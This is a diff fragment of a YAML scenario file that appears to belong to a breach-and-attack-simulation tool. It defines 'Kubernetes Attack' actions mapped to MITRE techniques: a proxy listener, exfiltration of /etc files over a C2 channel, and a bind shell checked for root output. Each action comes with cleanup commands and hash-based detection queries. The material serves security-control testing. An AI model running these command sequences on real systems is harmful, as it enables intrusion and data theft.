+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/udpServer.elf'
+                  is_async: true
+                  remote_files:
+                    - file: files/dWRwU2VydmVyX19fZjZmNjM2YTQtNGFlMi00NDI4LThjNWMtNmNmNDE3Y2RkMDQwLmVsZg==
+                      path: udpServer.elf
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: '"$WORKDIR"/udpClient.elf'
+                  remote_files:
+                    - file: files/dWRwQ2xpZW50X19fM2EzNDUyZGUtZDgxMy00NTcyLWIyZmUtY2Y5MWVjMDY2MmYxLmVsZg==
+                      path: udpClient.elf
+                      is_executable: true
+                      is_downloaded: true
+                  success_conditions:
+                    - output: HandshakeOk
+              rewind_processes:
+                - arguments: rm -rf "$WORKDIR"/udpClient.elf
+                - arguments: rm -rf "$WORKDIR"/udpServer.elf
+              keyword_queries:
+                - (( ((("udpServer.elf" OR "udpServer___f6f636a4-4ae2-4428-8c5c-6cf417cdd040.elf")) OR ("ffcbe059dcb341f9220f9abf0a19b85d9dfc2ad9261910395748af8f557ccef4" OR "c9b1a960fb98267c218f7ce5555298219b59d5b0" OR "58f9cce501f937dcb3d6c409d6624d32")) OR ((("udpClient.elf" OR "udpClient___3a3452de-d813-4572-b2fe-cf91ec0662f1.elf")) OR ("04540901bd71f7253cc5a085ddbf3b09fbfcd1291ea810968bbb45001eb80456" OR "824e3ebca74e4bcddf1f9d3c9fd0a0eced9b7949" OR "e7b4cca48a2af58c8253752e592e97a5")) ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Start a Proxy Listener via PySoxy Tool
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to start a proxy listener for leveraging Tor or similar services.
+              tactic: TA0011
+              technique: T1090
+              sub_technique: T1090.001
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: python3 "$WORKDIR"/PySoxy.py
+                  is_async: true
+                  timeout: 10000
+                  remote_files:
+                    - file: files/UHlTb3h5X19fMGQwOTc3ZWEtZmRjNy00MTMyLTg1MmEtOGZkYzUzMDhkMDQ5LnB5
+                      path: PySoxy.py
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: ss -tulnp | grep 0.0.0.0:9050
+                  delay: 1000
+              rewind_processes:
+                - arguments: pkill -f pysoxy*
+                - arguments: kill -9 $(ss -tulnp | grep 9050 | grep -o 'pid=[0-9]*' | cut -d= -f2)
+                - arguments: rm -rf "$WORKDIR"/PySoxy.py
+              keyword_queries:
+                - ((("PySoxy.py" OR "PySoxy___0d0977ea-fdc7-4132-852a-8fdc5308d049.py") OR ("468cd812627526e4501625be1f5a1d81ce3feb53" OR "87442010965a25fbd9c9734a696a677ab0a8acd0516bb421179714a91bf2161a" OR "ab847b9d4de2e33070cea2600293bca9") OR ("ss" AND "tulnp") OR ("grep" AND "0.0.0.0:9050")) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Exfiltrate File over C2 Channel
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to exfiltrate the files under the /etc directory over the C2 channel.
+              tactic: TA0011
+              technique: T1041
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-3%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/server.elf'
+                  is_async: true
+                  remote_files:
+                    - file: files/c2VydmVyX19fNzI1Y2ZkYzUtMzZjMC00YzQ4LTk3MWItZjM0OTc3M2RlYmU5LmVsZg==
+                      path: server.elf
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: '"$WORKDIR"/client.elf;sleep 30'
+                  remote_files:
+                    - file: files/Y2xpZW50X19fYTI4NjU4OTYtM2I0MS00NDQzLTgzYmEtMGY4ZDIyNTQ2YTI5LmVsZg==
+                      path: client.elf
+                      is_executable: true
+                      is_downloaded: true
+                  success_conditions:
+                    - output: Done
+                - arguments: ls -la "$WORKDIR"/exfil.tar.gz
+                  success_conditions:
+                    - output: exfil.tar.gz
+              rewind_processes:
+                - arguments: rm -rf "$WORKDIR"/exfil.tar.gz
+                - arguments: rm -rf "$WORKDIR"/server.elf
+                - arguments: rm -rf "$WORKDIR"/client.elf
+              keyword_queries:
+                - (( ((("server.elf" OR "server___725cfdc5-36c0-4c48-971b-f349773debe9.elf")) OR ("6ec44b4488c04c00c57b81fc80a917eab047df79607d2b344d4a0f7dc6cef21d" OR "404b70f16075b2d6c23194d26413874ef68ed0f9" OR "36d05dac144d49d2f30c5d20a2d3d7e6")) OR ((("client.elf" OR "client___a2865896-3b41-4443-83ba-0f8d22546a29.elf")) OR ("f51432dd0799f00a007ae693b54bbb9d23e51ebf43a61dbe34ba8cef839476ab" OR "961eb28f834c532d238ce712f1e68d3cba13e091" OR "807da60c0149511fc18c1c4c1cfb45a4")) OR ("30" AND "sleep") OR ("ls" AND "/exfil.tar.gz" AND "-la") ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Execute Command with Bind Shell
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to access the remote machine with a bind shell.
+              tactic: TA0002
+              technique: T1059
+              sub_technique: T1059.004
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Execution
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-3%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/Linux_bind_shell.elf'
+                  is_async: true
+                  timeout: 20000
+                  remote_files:
+                    - file: files/TGludXhfYmluZF9zaGVsbF9fXzQxNGVkYWQ0LWUxNWUtNDZmNy1iZmYxLTNkM2I0ZThlYzdlNS5lbGY=
+                      path: Linux_bind_shell.elf
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: '"$WORKDIR"/customshell.elf "$WORKDIR"'
+                  timeout: 5000
+                  remote_files:
+                    - file: files/Y3VzdG9tc2hlbGw0X19fNWU4ODhmY2ItMTRhZS00NjhjLTgyNjctOGE4MWM1NmEzYmZlLmVsZg==
+                      path: customshell.elf
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: cat "$WORKDIR"/output.txt
+                  delay: 5000
+                  success_conditions:
+                    - output: root
+              rewind_processes:
+                - arguments: pkill -9 -f customshell.elf
+                - arguments: kill -9 $(ss -tulnp | grep 8080 | grep -o 'pid=[0-9]*' | cut -d= -f2)
+                - arguments: rm -rf "$WORKDIR"/customshell.elf
+                - arguments: rm -rf "$WORKDIR"/Linux_bind_shell.elf
+                - arguments: rm -rf "$WORKDIR"/output.txt
+              keyword_queries:
+                - (( ((("Linux_bind_shell" OR "Linux_bind_shell___414edad4-e15e-46f7-bff1-3d3b4e8ec7e5.elf")) OR ("9e17d1d6fa4b5b502d8e41b638a85f07e175665f716933eafa851ba787ca7b59" OR "1d16e53c7137708686f1aa2a5cda7e2700f2144b" OR "6cbbfc9278243433eef8ca81d70e0b86")) OR (("Linux_bind_shell") OR ("41cda4ee417d4bb8be5aab8dc9f406cbcadeb74a981aba8f59e986c4f9744aea" OR "6382738b7207919a4638bd7a77cd023bc1d7bf61" OR "9785670a82b296ecb810a2e542c25e6e")) ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
